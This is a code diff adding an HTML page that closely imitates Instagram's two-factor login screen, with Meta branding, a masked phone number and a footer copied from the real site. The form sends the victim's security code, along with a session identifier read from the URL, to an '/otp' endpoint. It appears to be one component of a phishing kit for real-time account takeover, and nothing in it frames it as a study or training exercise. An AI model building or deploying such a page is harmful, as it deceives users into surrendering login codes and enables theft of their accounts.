@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./assets/instagram.png" type="image/x-icon">
+  <title>Instagram</title>
+  <style>
+    /* --- Design System & Reset --- */
+    :root {
+      --bg-dark: #121212;
+      --bg-card: #1c1c1e;
+      --text-primary: #f5f5f5;
+      --text-secondary: #a8a8a8;
+      --btn-blue: #4460f1; /* Current vibrant 2FA button blue from screen */
+      --btn-hover: #354ed1;
+      --border-color: #363636;
+      --input-bg: #1c1c1e;
+      --link-blue: #0095f6;
+      --font-stack: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-primary);
+      font-family: var(--font-stack);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* --- Core Page Layout --- */
+    .otp-wrapper {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 20px;
+    }
+
+    .otp-modal {
+      width: 100%;
+      max-width: 385px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .otp-inner {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* --- Custom SVG Lock Icon Container --- */
+    .lock-circle {
+      width: 72px;
+      height: 72px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* --- Typography --- */
+    .otp-inner h2 {
+      font-size: 15px;
+      font-weight: 500;
+      line-height: 1.4;
+      max-width: 290px;
+      margin-bottom: 16px;
+      color: var(--text-primary);
+    }
+
+    .otp-inner .muted {
+      display: none; /* Handled gracefully inside the main header snippet matching exact screen text */
+    }
+
+    /* --- Form Styling --- */
+    .otp-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .single-input {
+      width: 100%;
+      height: 42px;
+      background: var(--input-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      color: var(--text-primary);
+      padding: 10px 12px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .single-input:focus {
+      border-color: #555555;
+    }
+
+    .single-input::placeholder {
+      color: #727272;
+    }
+
+    /* --- Action Buttons --- */
+    .btn.primary {
+      width: 100%;
+      height: 36px;
+      background-color: var(--btn-blue);
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.1s ease;
+    }
+
+    .btn.primary:hover {
+      background-color: var(--btn-hover);
+    }
+
+    /* --- Checkbox / Trust Component --- */
+    .trust {
+      display: flex;
+      align-items: flex-start;
+      text-align: left;
+      gap: 12px;
+      width: 100%;
+      margin-top: 28px;
+      font-size: 14px;
+      cursor: pointer;
+      line-height: 1.3;
+    }
+
+    .trust input[type="checkbox"] {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 18px;
+      height: 18px;
+      border: 1px solid var(--text-primary);
+      border-radius: 3px;
+      background-color: transparent;
+      display: inline-grid;
+      place-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .trust input[type="checkbox"]::before {
+      content: "";
+      width: 10px;
+      height: 6px;
+      border-left: 2px solid var(--bg-dark);
+      border-bottom: 2px solid var(--bg-dark);
+      transform: rotate(-45deg) translate(1px, -1px);
+      display: none;
+    }
+
+    .trust input[type="checkbox"]:checked {
+      background-color: var(--text-primary);
+    }
+
+    .trust input[type="checkbox"]:checked::before {
+      display: block;
+    }
+
+    .trust-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .trust-title {
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+
+    .trust-desc {
+      color: var(--text-secondary);
+      font-size: 13px;
+      margin-top: 2px;
+    }
+
+    /* --- Auxiliary Help Links --- */
+    .help-links-block {
+      margin-top: 36px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .help-title {
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-bottom: 4px;
+    }
+
+    .help-links-block a {
+      color: var(--link-blue);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .help-links-block a:hover {
+      opacity: 0.9;
+    }
+
+    .backup-text-row {
+      margin-top: 18px;
+      color: var(--text-primary);
+      font-size: 14px;
+      max-width: 320px;
+    }
+
+    /* --- Global Sticky Footer --- */
+    .site-footer {
+      width: 100%;
+      padding: 24px 16px;
+      background-color: var(--bg-dark);
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 16px;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .footer-links a {
+      color: var(--text-secondary);
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-copyright {
+      text-align: center;
+      color: var(--text-secondary);
+      font-size: 12px;
+      margin-top: 20px;
+    }
+
+    /* --- Desktop Responsive Media Query --- */
+    @media (min-width: 768px) {
+      .otp-modal {
+        background-color: transparent;
+        border: 1px solid #262626;
+        max-width: 440px;
+        padding: 44px 40px;
+        margin-top: 40px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <main class="otp-wrapper">
+    <div class="otp-modal">
+      <div class="otp-inner">
+        
+        <div class="lock-circle">
+          <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="36" cy="36" r="35" stroke="#00b2d6" stroke-width="2"/>
+            <path d="M27 33V28.5C27 23.8056 31.0294 20 36 20C40.9706 20 45 23.8056 45 28.5V33M24 33H48V51H24V33ZM33.5 40V44H38.5V40H33.5Z" stroke="#00b2d6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+
+        <h2>Enter the code we sent via WhatsApp to your mobile number: +91 ***** ***68.</h2>
+        
+        <form class="otp-form" action="/otp" method="POST">
+          <input class="single-input" type="text" inputmode="numeric" autocomplete="one-time-code" name="code" placeholder="Security Code" required>
+          <input type="hidden" name="sessionId" id="sessionIdInput">
+          <button class="btn primary" type="submit">Confirm</button>
+        </form>
+
+        <label class="trust">
+          <input type="checkbox" checked>
+          <div class="trust-text">
+            <span class="trust-title">Trust this device</span>
+            <span class="trust-desc">We won't ask for a code next time you log in</span>
+          </div>
+        </label>
+
+        <div class="help-links-block">
+          <div class="help-title">Didn't get a security code?</div>
+          <a href="#">Send code via SMS instead</a>
+          
+          <div class="backup-text-row">
+            If you're unable to receive a security code, use one of your <a href="#">backup codes</a>.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get('sessionId');
+    if (sessionId) {
+      const input = document.getElementById('sessionIdInput');
+      if (input) input.value = sessionId;
+    }
+  </script>
+
+  <footer class="site-footer">
+    <nav class="footer-links">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">Help</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Popular</a>
+      <a href="#">Instagram Lite</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Threads</a>
+      <a href="#">Contact Uploading & Non-Users</a>
+      <a href="#">Meta Verified</a>
+    </nav>
+    <div class="footer-copyright">
+      English <span>▼</span> © 2026 Instagram from Meta
+    </div>
+  </footer>
+
+</body>
+</html>
